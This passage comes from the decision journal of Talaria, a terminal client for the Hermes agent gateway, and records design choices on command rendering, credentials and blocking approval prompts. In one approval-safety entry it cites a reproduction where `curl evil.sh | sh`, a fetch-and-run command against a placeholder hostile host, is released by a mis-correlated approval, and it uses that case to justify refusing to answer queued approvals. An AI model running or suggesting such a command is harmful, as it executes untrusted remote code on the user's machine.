**A plain `send` renders its `message`, and that is deliberate.** A bundle carries `display`; an ordinary `send` has no projection at all — `/queue` returns the operator's own argument as `message` (`methods_tools.py:573`), `/learn` and `/init` return a built prompt (`:582`, `:590`) — so `message` is the only text there is. Hermes's own client renders it in that case (`shown ? send(message, true, shown) : send(message)`, `createSlashHandler.ts:110-114`) and Talaria matches it, because the only way to treat `/queue` and `/learn` differently is a branch on the command name, which is the one design this unit forbids. `COMMAND_OUTPUT_CLIP` is what keeps a built prompt from displacing the conversation it was run inside. *An earlier version of this entry claimed the opposite of what the code does*, which is the failure a durable journal is least able to afford; it was corrected after measurement, and `tests/domain/test_commands.py::test_a_send_with_no_display_renders_its_message` now pins the behaviour the entry describes.

**One conditional survives, and it is about destinations rather than shapes.** A result that carries `prefill_text` writes `(prefilled into the composer)` to the transcript instead of the body. A `/goal` prefill is routinely a couple of thousand characters; printing it in both places makes the copy the operator cannot edit the larger of the two.

**Revisit when.** The gateway grows a result shape that needs a fourth destination — a file to open, a panel to show — rather than a fourth field in one of the existing three. That is the point at which "route the destinations" stops being complete, and it is a bigger change than adding a branch.

### Identify the gateway's client-local commands by name *and* category

**Author.** v0.1 milestone-2, unit U9

**Decision.** An entry is unsupported when its name is one of `/density`, `/logs`, `/mouse`, `/sessions` **and** its catalogue category is `TUI`. Both halves are required.

**This already discriminates today, on one of the four names.** The registry defines `CommandDef("sessions", "Browse and resume previous sessions", "Session")` (`hermes_cli/commands.py:180`), so the gateway's dedup guard drops the `/sessions` extra and a real `commands.catalog` serves `/sessions` under category `Session` — dispatchable. The plan's list of four client-local names is one name out of date; three render unsupported and `/sessions` renders as an ordinary command. That is a deviation from the plan text, settled by the pinned registry rather than deferred to a live run.

**Rejected alternatives.** *Name alone* refuses the dispatchable `/sessions` above. *Category alone* would refuse every future `TUI`-categorised command sight unseen, including one that is genuinely dispatchable. *Probing each of the four at startup* to see whether they error was rejected outright: `command.dispatch` is classified `evidence-only` by KTD9 precisely because dispatching is a mutation, and four speculative dispatches at startup is four side effects to learn something the catalogue already says.

**Revisit when.** Hermes moves the extras out of `_TUI_EXTRA`, gives them real handlers, or files a registry command under category `TUI` — any of which makes the pair stop discriminating. The check is one function, `_is_client_local`, and the four names and the category are named constants beside it.

### A non-positive paste-collapse bound switches that bound off

**Author.** v0.1 milestone-2, unit U9

**Decision.** `PasteThreshold.trips` treats `lines <= 0` and `byte_limit <= 0` as "this half is not in use". Setting both to zero collapses nothing; setting lines to zero leaves the byte bound working.

**Rationale.** It re-encodes the shipping client's own guard — `pasteCollapseLines > 0 && lineCount >= pasteCollapseLines` (`ui-tui/src/app/useComposerState.ts:277-280` at `7f4d15515`) — so an operator who has tuned Hermes gets the same behaviour from Talaria. It also closes the reading `QUEUED.md`'s unbounded-configuration item flagged: read as a threshold, `TALARIA_COMPOSER_PASTE_COLLAPSE_LINES=0` means "collapse at zero lines" and sends every one-word paste on a round trip.

**Rejected alternatives.** *Clamping to the KTD16 defaults* silently overrides what the operator asked for. *Raising a configuration error* stops the client from starting over a paste setting. Both were rejected because there is a reading of `0` that is useful and unambiguous, and it is the one Hermes already uses.

**Revisit when.** A third bound is added, or the setting grows a form where `0` means something else.

### The interrupt affordance belongs to the sub-agent row

**Author.** v0.1 milestone-2, unit U9

**Decision.** `subagent.interrupt` is reachable only from the row of the child it stops — a click on that row, or Enter while it is focused. Terminal rows carry no affordance at all.

**Rationale.** The call takes a `subagent_id` (`tui_gateway/methods_session.py:2806-2814`), so a global key binding would have to invent a rule for which child it meant, and the rule would be wrong exactly when it mattered: a fan-out of six with one runaway is the situation the control exists for, and "the most recent" or "the first running" is a guess about which of the six the operator was looking at. A finished child answers `found: false`, and an affordance that is always refused teaches the operator to ignore it.

**Rejected alternatives.** *A key binding plus a selection cursor* is the general answer and adds a second focus owner competing with the composer, which is the widget the whole interface is built around. *Reusing F4* was rejected on safety grounds: F4 is `session.interrupt`, whose cancelled state is sticky and suppresses every later delta, so conflating the two would let "stop this child" silently swallow the rest of the parent's reply.

**Revisit when.** The row list grows keyboard navigation for another reason, at which point Enter-on-focus is already the binding and only the cursor is new.

## 2026-08-01

### Name the project Talaria

**Author.** Jeff Cox / project bootstrap

**Decision.** Use `Talaria` as the project name and `infiquetra/talaria` as the public repository slug.

**Rejected alternatives.** `hermes-tui` was the clearest descriptive name, but Talaria gives the project a distinctive identity while retaining a direct Hermes reference. `mimir-tui` and `bifrost-tui` were less immediately discoverable as a Hermes TUI.

**Rationale.** The project is intended to be a serious upstream contribution candidate rather than a permanently branded private fork. Talaria is memorable and leaves room for that relationship.

**Revisit when.** Upstream Hermes adopts a conflicting name, a trademark concern appears, or the project becomes an official Hermes distribution with different naming requirements.

## 2026-08-01

### Use a fresh client with layered Hermes adapters

**Author.** Project bootstrap

**Decision.** Build a thin client around the Hermes API, optional TUI gateway, and typed Kanban adapter instead of importing Hermes core or copying the entire existing TUI.

**Rejected alternatives.** API-only loses important control-plane UX; a wholesale TUI fork carries too much existing rendering complexity and makes upstream boundaries unclear.

**Rationale.** Layered adapters preserve independent installation, make capabilities explicit, and let individual changes become focused upstream proposals.

**Revisit when.** Hermes publishes a stable external TUI SDK, the existing TUI is refactored into a smaller reusable package, or the adapter boundary proves unable to support required workflows without unacceptable duplication.

## 2026-08-02

### Gate OpenTUI first, keep Bubble Tea v2 as the fallback, and stop investing in stock Ink

**Author.** Independent framework analysis and reconciliation

**Status.** Superseded on 2026-08-02 by the Textual-first validation decision below. The analysis remains provenance for the earlier weighting.

**Decision.** Treat TypeScript with OpenTUI as Talaria's presumptive stack, subject to a bounded frame-replay and clean-install gate. Use Go with Bubble Tea v2 if OpenTUI fails renderer-correctness, domain-isolation, package-reproducibility, or no-private-fork criteria. Do not add product behavior or renderer infrastructure to the current stock-Ink shell while the gate is open.

**Rejected alternatives.** Adopting OpenTUI immediately would convert a pre-1.0 native dependency into architecture without proving its packaging contract. Continuing on stock Ink would inherit renderer work that Hermes's own private fork demonstrates directly. Ratatui has the strongest low-level buffer test surface but leaves more whole-client infrastructure to Talaria than Bubble Tea. Textual remains the product-velocity alternative if compound widgets become the actual bottleneck, not the default.

**Rationale.** OpenTUI is the only inspected TypeScript candidate that combines a native cell renderer, synchronized-output handling, deterministic frame capture, and transcript-adjacent primitives. It preserves Talaria's real TypeScript investment—the recorder, redaction boundary, transport code, fixtures, and tooling—without preserving Ink. Bubble Tea v2 is the operational fallback because its current source verifies negotiated mode 2026, buffered cell rendering, injectable I/O and terminal size, golden output tests, headless operation, and a simpler native distribution story.

**Evidence.** [Final language and TUI framework analysis](../analysis/2026-08-02-language-and-tui-framework-analysis-final.md), reconciled from the [independent pass](../analysis/2026-08-02-language-and-tui-framework-analysis-independent.md) and the [original four-candidate analysis](../analysis/2026-08-02-language-and-tui-framework-analysis.md).

**Revisit when.** The validation gate completes; OpenTUI materially changes its runtime, native-package, or API-stability contract; the supported platform matrix becomes explicit; or compound-widget implementation cost exceeds renderer and transport work. The passing result, validated version, and package contract belong in an ADR before the implementation expands.

### Gate Textual first and keep Bubble Tea v2 as the native-distribution fallback

**Author.** Jeff Cox / framework-analysis reconsideration

**Status.** Partly promoted and partly amended on 2026-08-02. Its language half is now [ADR-0004](../../platform-specs/04-architecture/adrs/0004-talaria-is-a-python-client.md): Python is settled, because the operator answered the open seventh consideration — a zero-runtime native executable is **not** a product requirement — which removed Go's only advantage Python cannot match. **The Bubble Tea fallback is retired.** A framework failure is not evidence against the language that selected it, so the fallback is another Python presentation layer; identifying one is now queued as a prerequisite of the gate, because none has ever been assessed. The Textual half stands unchanged and still runs the gate before any ADR names it.

**Decision.** Treat Python with Textual 8.2.8 as Talaria's presumptive stack, subject to a bounded protocol-replay, long-transcript, pseudo-terminal, and clean-install gate. Use Go with Bubble Tea v2 if Textual fails a material correctness or transcript-cost requirement, or if a small zero-runtime native executable becomes mandatory. Do not adopt either dependency in an ADR until the first gate completes.

**Rejected alternatives.** Keeping OpenTUI first would preserve implementation language for a greenfield codebase whose current TypeScript is not a meaningful migration estate. Adopting Textual immediately would leave long-history behavior, PTY correctness, and packaging unproved. Building complete Textual and Bubble Tea clients in parallel would create two products instead of a validation gate. Ratatui remains the alternative if exact cell-buffer equality becomes a release requirement.

**Rationale.** Talaria will be predominantly agent-built, most Infiquetra repositories and Hermes core are Python, and Textual has the broadest compound-widget surface plus a first-party `run_test()` and `Pilot` verification loop. Python can provide an ordinary `talaria --yolo` command through standard entry points and `uv tool install`; Go's distribution advantage matters only if the product requires a small native artifact without a managed runtime. Textual must still prove bounded transcript mounting, coalesced streaming, framework-independent domain state, deterministic headless behavior, PTY correctness, and clean installation.

**Evidence.** [Reconsidered language and TUI framework analysis](../analysis/2026-08-02-language-and-tui-framework-analysis-reconsideration.md), including late independent research that corrected current Ink and Bubble Tea capabilities and advanced Textual to full scoring.

**Revisit when.** The Textual validation gate completes; the missing seventh operator consideration adds a hard constraint; the supported platform matrix or native-artifact requirement becomes explicit; Textual cannot bound transcript cost without a private fork; or exact cell-buffer replay becomes a release gate. A passing result, validated version, Python support window, and package contract belong in an ADR before implementation expands.

### Ideation working records stay out of the repository; only the scrubbed artifact ships

**Author.** First full-product ideation run

**Decision.** Ideation runs write their working record under `.claude/saga/`, which is gitignored. Only the reviewed, scrubbed artifact under `docs/ideation/` is committed. Local probe output, profile names, local ports, local file paths, and machine-specific measurements are generalized to the claim they support before anything enters `docs/`. Citations to public Hermes Agent source are kept verbatim, because that repository is public and it carries the strongest evidence.

**Rejected alternatives.** Committing the full working record would have published a live inventory of a private Hermes install. Dropping the evidence entirely would have destroyed the basis contract that makes an ideation artifact reviewable — a surviving idea with no stated evidence is an opinion.

**Rationale.** The evidence is the quality mechanism, so it cannot be deleted; the instances are the private part, so they cannot be published. Replacing each instance with the claim it supports keeps both properties. This matches the convention `docs/analysis/2026-08-01-hermes-tui-project-direction.md` already set for itself.

**Revisit when.** The repository stops being public, an ideation run touches nothing local, or a reviewer cannot follow a survivor's reasoning because the generalization removed something load-bearing.

### Talaria reads agent state; it does not author agent identity

**Author.** Jeff Cox, mid-run scope correction

**Decision.** Talaria is a client of the Hermes agent, not an administration surface for it. Profile creation, generation, editing, pruning, rollback, and configuration writes stay outside this project. Talaria may select a profile, show which profile a value came from, and aggregate work and sessions across profiles.

**Rejected alternatives.** Five separate ideation candidates proposed profile viewing or management surfaces, including strictly read-only ones. All were cut. Two of them were rewritten mid-run into pure read-only form and were still cut, so the boundary is drawn at the _administration surface_, not merely at the write.

**Rationale.** A strong decoupling between the terminal UI and the agent it connects to keeps the client replaceable and keeps agent identity owned by the tooling that generates it.

**Revisit when.** The intended line turns out to be "no writes to agent identity" rather than "no agent-admin surface at all." Under that reading, cuts R1 and R5 in [the product-shape ideation](../ideation/2026-08-02-talaria-product-shape-ideation.md) survive as written, and the profile axis regains four candidates.

### The v0.1 implementation plan pins its load-bearing technical decisions

**Author.** `/plan` run from the reviewed v0.1 requirements

**Status.** Amended on 2026-08-02 by this plan's doc review, then **settled the same day**. The original credential decision was **wrong on its facts** and is withdrawn; everything else in the entry stands. At Hermes `7f4d15515` — the revision installed on the operator's machine, `~/.hermes/hermes-agent` at `HEAD` — the WebSocket upgrade reads its credential only from query parameters (`_ws_auth_reason`, `hermes_cli/web_server.py:14443-14524`, enforced for `/api/ws` at `:15609-15617`) and never inspects a header. The two lines originally cited as witnesses govern HTTP: `:384` is the legacy Bearer branch of `_has_valid_session_token(request: Request)`, behind the preferred `X-Hermes-Session-Token`; `:398` is a query-token check restricted to `/api/files/download`.

The replacement is now decided. Gate selection is not an operator flag: `should_require_auth` (`:437-460`) returns true for any bind host that is not `localhost`, `127.0.0.1`, or `::1`, and the legacy `--insecure` escape hatch is accepted but **ignored** since the June 2026 `hermes-0day` campaign. The default bind is loopback (`start_server`, `:17059-17061`), so a default Hermes is ungated and takes `?token=`. Gated mode also turned out to be fully reachable for a dial-don't-launch client, contrary to the review's initial doubt: a complete RFC 8252 native-app flow exists (`dashboard_auth/routes.py:289`, `:841`, `:799`, `:894`) minting single-use 30-second tickets. **v0.1 targets loopback `?token=` only**, with remote/gated attach queued. See the [plan doc review](../reviews/2026-08-02-talaria-v0-1-prototype-plan-doc-review.md).

**Decision.** The [v0.1 implementation plan](../plans/2026-08-02-talaria-v0-1-prototype-plan.md) fixes sixteen KTDs; the load-bearing subset: wire models are frozen dataclasses with explicit decoders, no Pydantic in the domain core. Attach credentials are acquired env-first via `HERMES_DASHBOARD_SESSION_TOKEN`, then `~/.talaria/credentials` at `0600`, then a hidden prompt — the acquisition chain survives the amendment above. **"Never appear in argv" is narrowed here to what it is actually true of: the acquisition chain itself.** As first written this clause read as an argv guarantee for the whole program, which `talaria record` violated until the 2026-08-05 credential-and-bridge-drift remediation plan's U2 (`docs/plans/2026-08-05-credential-and-bridge-drift-remediation-plan.md`) — it took the gateway URL, credential included, as a required positional argument, and nothing acquired through the chain described here was involved. The claim as measured today is: the `CredentialProvider` chain itself never writes a credential to argv, and the process-surface sweep (U3, `tests/transport/test_process_surface.py`) now measures that across every shipped entry point that can hold one — the bare launcher, `record`, and `refresh-credential` — rather than the bare launcher alone. The credential rides the URL as `?token=` and is minted by a `CredentialProvider` invoked **on every dial including every reconnect**, never fetched once at startup: a gated ticket is single-use with a 30-second life, so building the seam per-connection now is what keeps the deferred remote path from becoming a reconnect rewrite. Because the credential must ride the URL, `redactUrl` (`src/record/redact.ts:106-122`) becomes the load-bearing control keeping it out of the frame log's `endpoint` field; it covers the bare `token` key but neither `ticket` nor `internal`, so the Python port is a **strict superset** of the TypeScript redactor with those two added and the divergence enumerated in a test. Configuration lives in a two-level `~/.talaria` directory (repo-local `./.talaria` overrides it), read only by `talaria/config.py`. The composer is Textual's `TextArea` in plain-text configuration with Enter-submits and Ctrl+J-newline. The status contract v1 delivers one JSON document on the child's stdin, renders rows as literal text, and gives the child a default-deny environment with an operator allowlist. prompt_toolkit is the named Python fallback presentation layer, assessed before the Textual gate verdict. Milestone 2 transport is asyncio plus `websockets`, with every RPC lost to a disconnect resolved as unknown-outcome, never success. One `FrameSource` seam feeds replay and live identically, and the compatibility baseline is pinned checked-in data — mutating gateway methods are never invoked as probes.

**Rejected alternatives.** Pydantic at the wire (its coercion masks exactly the malformations R5/R37 exist to surface); the query-parameter token (reaches URLs, the frame-log `endpoint` field, and process listings — **not actually a rejected alternative to something else usable: this entry's own amendment above establishes that the WebSocket upgrade reads a credential only from a query parameter, so there was no header-based route to prefer it over. What is rejected in substance is letting that query parameter reach the surfaces named here unmitigated, which is why `AttachTarget` strips it at construction, `redact_url` withholds it from the frame log, and `talaria record` now refuses rather than accepts a credential-bearing URL on its command line — U2/U3 of the 2026-08-05 credential-and-bridge-drift remediation plan**); Textual's `Input` (single-line, fails multi-line R12); Shift+Enter as the newline binding (not deliverable without kitty-protocol support the matrix does not assume); `aiohttp` (a larger dependency for the same client capability); argv or shell delivery of the status payload (R18 forbids interpolating session data into a command).

**Rationale.** Each decision carries its tradeoff, falsifier, and requirement trace as KTD1–KTD14 in the plan, which is the full record; this entry is the journal mirror.

**Learning.** The withdrawn credential claim is the generalizable one: both of its "independent witnesses" were real lines in the right file that answered a *different question* — HTTP request auth, not WebSocket upgrade auth. Two citations agreeing is not corroboration when both are drawn from the same misread. The rule this repository now applies: cite the function that the caller you care about actually invokes, and name that caller in the citation — here, `/api/ws` calls `_ws_auth_ok`, so nothing outside `_ws_auth_reason` could have settled it. The plan had correctly labelled this its least-proven external claim and scheduled a live test, which is why the error cost a review cycle instead of a milestone.

**Revisit when.** The Textual gate fails (composer and streaming decisions route to the assessed fallback); the live attach in U7 either confirms or refutes the loopback `?token=` form; the operator wants a remote gateway, which activates the queued `GatedTicketProvider` work; Hermes adds header acceptance to the WS upgrade, which would restore the original decision; the U5 memory growth curve shows a slope that makes domain-transcript eviction a requirement; or decoder boilerplate materially outgrows its value in milestone 2, which reopens the model-library question for the wire boundary only.

---

## 2026-08-02 — v0.1 proceeds without further independent-review ceremony

**Author.** Operator, recorded by the v0.1 plan doc review

**Decision.** The inherited finding DR15 — that the independent review panel over the v0.1 requirements dispatched three units but recorded only one completed final response — is **overridden**, and implementation may begin. It does not block `/work`.

**Rationale.** DR15 is a receipt-keeping gap, not a review gap, and it is unsatisfiable as written: the requirements reconciliation itself records that "the panel-independence property has no mechanical verifier in the available tooling," so no re-run can close it either. The substantive obligation has been discharged well past its bar — the requirements carry a doc review plus an external reconciliation, and the plan carries a doc review plus a two-engine external panel (`codex/gpt-5.6-sol` and `ollama-cloud/kimi-k3`, both at maximum reasoning effort) whose findings were verified against primary sources and applied across two rounds, the second of which was a check on the first round's own corrections.

**Rejected alternatives.** Re-running the panel to produce better receipts (buys a receipt, not information, against a checker that does not exist); leaving the block in place (indefinite, since nothing can clear it).

**Learning.** A process gate whose verifier was never implemented becomes a permanent block that looks like diligence. When a finding requires a mechanical check, confirm the checker exists before the finding is allowed to gate anything; otherwise record it as advisory from the start.

**Revisit when.** Talaria gains contributors beyond the operator, or a mechanical panel-independence verifier lands in the saga tooling — at which point review ceremony has a real reader and a real check.

## 2026-08-03 — The prompt region reveals the first card's control, and every card it cannot reveal says so

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fifth adversarial round — finishing round 4's own decision

**Decision.** `PromptRegion.reveal_actions` scrolls the **first** card's answering control into view, and then `mark_unreachable_controls` retitles every card by whether its own control lies inside the region's `scrollable_content_region`. A card whose control is on screen keeps the border title `waiting for you`; a card whose control is not on screen carries `answer below — scroll` instead. The retitling runs in both directions, so a card that scrolls back into view gets its ordinary title again.

**Rationale.** One bounded region cannot show every card's control, so the question is not *whether* some card loses and *which* — it is what the losing card is allowed to look like. Round 4 answered the first half correctly and implemented something else: it `return`ed inside the loop after the first card, which is "look at the first card and give up", not "reveal the first card's control". With a clarify parked above an approval, the clarify's one-row input was already visible, the scroll was a no-op, and the approval below kept its `waiting for you` title with its buttons off the bottom edge and every click on them landing nowhere.

That arrangement is ordinary, not exotic. The gateway's pending map is keyed by request id (`tui_gateway/server.py:146`, `:2961-2964` at Hermes `7f4d15515`), so several blocking prompts are outstanding simultaneously by design, and `_block`'s signature is `timeout: float | None = 300` where `None` means wait forever — a clarify configured with a non-positive timeout stays outstanding indefinitely, parked above whatever arrives next.

Revealing the **first** card is kept, with round 4's reason: with two approvals queued the only offered action is `deny all`, which applies to the whole queue from whichever card carries it, so reaching for the first keeps the oldest command — the one the gateway's FIFO resolver pops first — on screen instead of pushing it off. What is added is the second half of the requirement: no card may be left looking live with no reachable control. The border title is where that is said because the title is what is still *legible* — a control pushed past the bottom edge takes everything below it with it, so the border and the rows above the control are all that remain to read, and the border is the part that made the card read as live.

**Rejected alternatives.** *Reveal the last card instead* — the same defect with the operands swapped; the first card then looks live with nothing reachable, and it is the one the gateway resolves first. *Reveal every control in turn* — a scroll is one position; scrolling to card N and then to card 1 lands on card 1, so this is the current behaviour with extra work. *Rely on the scrollbar* — the region already has one, and round 4's reproduction had it on screen while the card still read as live; a scrollbar says "there is more", not "the thing you are about to click is not here". *Grow the region past `max-height: 70%`* — the cap exists so a queue of approvals cannot eat the transcript, and a card is only readable next to the transcript entry that explains it. *Refuse to mount a card the region cannot show* — hides a live question entirely, which is worse than showing it with a marker.

**Known gap, queued rather than fixed.** The retitling recomputes on a region resize, on a `CommandPanel.Rewrapped`, and nowhere else. Two arrangements therefore carry a stale title: a card with no command body mounting into a region already at its `max-height` (neither trigger fires), and an operator scrolling by hand (no trigger at all). Both are recorded in `QUEUED.md`. The stale direction is a card marked `answer below` whose control has come back into view, or the reverse for a control-only card — a wrong label rather than the original silent inertness.

**Revisit when.** The region gains a keyboard action that jumps to the next unanswered card, which would make "which control is revealed" much less load-bearing. Also revisit if a real session routinely queues more than two attended prompts, which would argue for a single-card region with an explicit "1 of 3" pager instead of a scrolling stack.

## 2026-08-03 — After a local withdrawal the screen says the state is unknown, and the frozen status document is left alone

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fifth adversarial round

**Decision.** `SessionState.withdrawn_approvals` counts approvals `age_out_approvals` withdrew whose fate is still unknown. `prompt_view` projects it as `PromptView.withdrawn`, and `activity_line` spends it on exactly one slot — the one that used to read `working…`:

> 1 approval withdrawn — whether the agent is still blocked is unknown

It does not outrank `waiting for you — …`, because a live prompt is something the operator can act on. It does not appear on an idle turn, because an idle turn is not making a claim that needs correcting. The count is cleared the moment the reducer sees the agent move — a change to the turn phase, the turn index, or the assistant's own accumulating text. **KTD5's status document is unchanged**: `turn` still reports `streaming` and `pending_prompts` still reports `0`.

**Rationale.** `turn_status` reports `waiting` only while `state.prompts` is non-empty, so the instant an approval ages out the turn falls back to `streaming` and the screen claims work. Whether that is a lie depends on a number Talaria cannot read. The gateway fails closed **and returns** — `tools/approval.py:4050` yields `"approved": False, "outcome": "timeout"` — so under its default 300-second wait the agent really did resume and `streaming` is true. A deployment that raised `HERMES_APPROVAL_TIMEOUT` above Talaria's own `APPROVAL_STALE_AFTER` gets the other case, where the gateway is still holding and the session will never move. Talaria cannot distinguish them, and the honest state after a withdrawal is neither `waiting` nor `working` but "this was withdrawn and what happens next is unknown".

The contract is where it stays a screen fix. `docs/formats/status-line.md` is `Authority: contract`, `Version: 1`, and frozen under KTD5: "the field set, the process behavior, and the environment rules below do not change without a `version: 2` bump", with `turn` enumerated at four values and `connection` at five. A fifth turn value is therefore not available, and inventing one would break every consumer written against version 1 while silently claiming the document had not changed shape.

The clearing rule is deliberately narrow. A heartbeat, an ambient event, or another prompt arriving proves the socket is alive and proves nothing about the agent — and the case this must not clear on is precisely the bad one, where the gateway still holds the approval and the agent is blocked inside the tool call producing nothing at all.

**Rejected alternatives.** *Report `waiting` after the withdrawal* — asserts the gateway is still holding, which is the less likely of the two cases under the default configuration and is not something Talaria observed. *Leave `streaming`* — the shipped behaviour, and a false "busy" is the specific failure R8 exists to prevent. *Add a fifth `turn` value* — breaks the frozen v1 contract for every external consumer; correct only alongside a `version: 2` document. *Keep the card on screen greyed out* — the projection would still count it, so the correlation rule would still be disabled for the next genuine approval, which is the defect the age-out was added to fix. *Clear the unknown state on any inbound frame* — a heartbeat would clear it, and heartbeats keep arriving while the agent is blocked, so the hedge would vanish in exactly the case it exists for.

**Revisit when.** KTD5's status document takes a `version: 2` bump for any other reason — the honest turn value belongs in that revision. Also revisit if the gateway publishes its configured approval timeout, which would let Talaria set `APPROVAL_STALE_AFTER` from the deployment and collapse the unknown case entirely.

## 2026-08-03 — A terminal-read's arrival is recorded in the transcript; its answer's outcome is not

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fifth adversarial round

**Decision.** `_report_prompt_outcome` is the single place an answered prompt's outcome sentence is routed. For `UNATTENDED_KINDS` — `terminal_read` — it goes to the composer notice bar only, for **all four** outcome classes: error, discarded, delivery-unconfirmed, and not-sent. The arrival line `prompt_registration_line` writes (`terminal_read prompt awaiting an answer: …`) **stays** in the transcript.

**Rationale.** `terminal.read` serves the transcript straight back to the agent, so anything Talaria writes there becomes part of the next answer. Round 4 fixed the compounding form of that — a restore loop that took one answer from 159 to 884 characters in three cycles — by taking the `not_sent` class off the transcript, keying the guard off `verdict.restore`. Three classes were still writing, one line per failed read. That is not a loop (exactly one call, the prompt settles, nothing grows), but the constraint round 4 was given was "the transcript must not be written into by a bridge that serves the transcript", and it held for one case in four. Applying it once, over the kind rather than over the disposition, is what makes it a rule instead of a patch.

The arrival line is kept, and the distinction is what it records. It is a statement about what the **gateway asked for**, not about what Talaria replied. Removing it would make an agent reading the operator's screen invisible in the operator's own record, and that is a privacy-relevant act the transcript should show. The operator loses nothing on the outcome side: the notice bar carries the full sentence for these kinds, and the notice bar is not a surface the read projection reads.

**Correction — this entry first claimed the arrival line "does not compound, because nothing downstream reads it and writes again". That is false, and two independent adversarial lenses measured it.** `terminal_read` *is* the thing downstream that reads the transcript, so every arrival line is served back inside the next read. Six sequential `terminal.read.request` frames in a session whose only real content is one `message.delta`:

| read | `terminal.read.respond` payload | arrival lines inside the payload |
|---|---|---|
| 0 | 172 bytes | 1 |
| 5 | 512 bytes | 6 |

The sixth answer is seven lines: six copies of `terminal_read prompt awaiting an answer: terminal read requested` and one line of actual session content. What is true is the narrower claim: **no individual line grows** — that was round 3's defect, one answer going from 159 to 884 characters — but the served buffer accumulates one self-generated line per read, without bound in the number of reads.

That is the same property this entry's own rejected-alternatives paragraph uses to turn down outcome lines ("small but unbounded in the number of reads"). The decision to keep the arrival line may still be right — it is one line rather than one-per-failure, and it buys the audit record — but it is being kept **at a cost this entry originally denied**, and the accounting is now: R5-5 removed between zero and one line per *failed* read and left one line per *every* read, so the residual self-contamination is strictly larger than what the round removed. Queued at P2 (`QUEUED.md`) to either move the arrival record to a side channel the read does not serve, or accept it with this measurement in view.

**Rejected alternatives.** *Keep writing outcomes and accept one line per failed read* — the contamination is small but unbounded in the number of reads, and it is Talaria's own commentary feeding back, which is the category the rule exists to forbid. *Drop the arrival line too* — buys a linear reduction in self-reference at the cost of the audit record for the one bridge that reads the operator's screen. *Keep the arrival line out of the read projection but in the transcript pane* — the projection and the pane would then show different buffers, which breaks terminal-read's own contract that it serves what is on screen. *Silence the notice bar as well* — the operator would have no signal at all that a read failed.

**Revisit when.** A real corpus shows repeated reads crowding the buffer with their own arrival lines — at which point the arrival record moves to a side channel the read does not serve, rather than disappearing. Also revisit if another bridge is ever added to `UNATTENDED_KINDS`, since the routing rule is keyed on that set.

## 2026-08-03 — An approval is answered only while it is the only one waiting; otherwise Talaria refuses and offers deny-all

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), closing an adversarial review's safety finding

**Decision.** Three rules, all in `talaria.domain`:

1. **No blocking request is ever discarded.** Each `approval.request` gets its own registry entry keyed `approval:<session_id>#<n>`, counting arrivals. The previous key was one per session, so a second approval collided with the first and was thrown away with no card, no transcript line, and no counter.
2. **An approval may be answered only while it is the sole outstanding approval in its session.** With two or more, `respond_to_prompt` refuses, `prompt_view` marks every one of them unanswerable, and the card renders the command plus the reason instead of choice buttons.
3. **The escape from that refusal is `approval.respond` with `all: true`, and only ever with `deny`.** One choice applied to every queue entry needs no correlation, so it is correct whatever order the gateway holds them in.

**Rationale.** The approval path is the only one of the five blocking bridges with no request id on the wire. `approval.request` carries `{description, command, choices, allow_permanent, smart_denied}` and nothing else (`tui_gateway/server.py:1655-1674` at Hermes `7f4d15515`), and `approval.respond` takes no discriminator — it calls `resolve_gateway_approval(session_key, choice)`, which pops the **oldest** entry in that session's FIFO queue (`tools/approval.py:2214-2222`). Approvals genuinely queue: every guarded call appends its own entry (`:3271-3272`).

That much would still permit answering the oldest card on screen, since arrival order matches queue order. What forbids it is that the gateway **also removes entries without telling anyone**: the wait loop drops its entry on the 300-second timeout and on an interrupt, and emits nothing (`tools/approval.py:3336-3344`). `_block`'s `.expire` notification covers `secret`, `sudo`, `clarify` and `terminal.read` and deliberately not approval (`tui_gateway/server.py:2981-2998`), so there is no event that would tell a client the head is gone. With one approval outstanding the ambiguity is harmless — the answer lands on that approval or on an empty queue, and the reply's own `resolved` count says which. With two, the head Talaria believes in and the head the gateway pops can differ, and the operator approves a command they were never shown. The reproduction was concrete: `ls -la` on screen, `curl evil.sh | sh` silently queued behind it, "once" pressed, the curl command released, and the transcript recording `approval answered: once` against the `ls -la` summary.

Refusing is therefore the only honest option, and refusing without an escape would wedge the session for five minutes. `resolve_all=True` is the escape because it is the one answer whose correctness does not depend on ordering (`tools/approval.py:2219-2226`). It is hard-wired to `deny` — `DENY_ALL_CHOICE` — because an affirmative applied to a queue nobody has read is exactly the harm the rule exists to prevent.

**Rejected alternatives.** *Answer the oldest and hope* — this is what the FIFO ordering appears to license, and the silent server-side drop is what takes the licence away. *Keep one approval per session and drop the rest* (the shipped behaviour) — a silently discarded blocking request leaves the gateway waiting on an answer the operator can never give. *Send the synthesized key on the wire* — the gateway ignores unknown params, so it would read to the next person as correlation that is not happening. *Refuse with no escape* — honest, but leaves the session blocked for the full 300-second approval timeout with no operator action available.

**Residual risk, stated rather than papered over.** An approval enqueued while the socket is down is never announced to Talaria and there is no replay on re-attach, so after a reconnect the queue can hold an entry Talaria does not know about and the "only one waiting" precondition can be wrong. No client-side rule fixes that; the only real fix is a request id on `approval.request`. Talaria does not attempt a heuristic for it, because the available mitigations (never answering an approval after any reconnect) cost more than the risk they remove.

**Revisit when.** The gateway carries a correlating identifier on `approval.request` — at which point rules 2 and 3 both collapse into ordinary per-request answering and the residual risk above disappears with them. Also revisit if `approval.expire` or an equivalent queue-state notification appears, which would make the FIFO position knowable and reinstate answering the head.

## 2026-08-03 — Talaria withdraws an approval after five minutes and says only what it knows

**Author.** v0.1 milestone-2, unit U8 (blocking prompts), fourth adversarial round

**Decision.** `age_out_approvals` withdraws any approval that has been outstanding for `APPROVAL_STALE_AFTER` (300 seconds), writing a `prompt-expired` transcript entry and latching the id into `flushed_prompt_ids` so a late `restore_prompt` cannot resurrect the control. It applies to **approval only**, to prompts in `prompts` only (not `answering`), and it is driven from the render tick with the clock the prompt's own `opened_at` came from — wall clock live, recorded clock in replay.

The line it writes claims nothing about the gateway:

> approval no longer offered — nothing was sent; the gateway's default wait is 5 minutes and it announces no approval timeout, so it has probably stopped waiting

**Rationale.** Approval is the one bridge with no `<bridge>.expire` (`tui_gateway/server.py:2981-2998` at Hermes `7f4d15515`; `tools/approval.py` drops its entry via `_drop_entry()` with no emit), so nothing closed a stale approval — and a stale approval is not inert. It keeps `outstanding_approvals` above one, which marks a *genuine* later approval unanswerable, which leaves the operator unable to allow the command they want while the only offered action denies it.

